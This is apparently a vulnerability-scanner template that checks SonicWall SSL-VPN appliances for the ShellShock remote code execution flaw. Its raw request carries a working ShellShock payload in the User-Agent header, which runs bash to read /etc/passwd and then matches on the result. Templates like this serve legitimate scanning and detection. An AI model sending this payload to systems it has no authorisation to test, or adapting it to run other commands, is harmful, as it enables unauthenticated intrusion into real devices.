id: sonicwall-sslvpn-shellshock
info:
  author: PR3R00T
  description: A vulnerability in Sonicwall SSLVPN contains a 'ShellShock' vulnerability
    which allows remote unauthenticated attackers to execute arbitrary commands.
  name: Sonicwall SSLVPN ShellShock RCE
  reference:
  - https://twitter.com/chybeta/status/1353974652540882944
  - https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/
  severity: critical
  tags: shellshock,sonicwall,rce,vpn
requests:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /cgi-bin/jarrewrite.sh HTTP/1.1

    Host: {{Hostname}}

    User-Agent: "() { :; }; echo ; /bin/bash -c ''cat /etc/passwd''"

    Accept: */*

    '
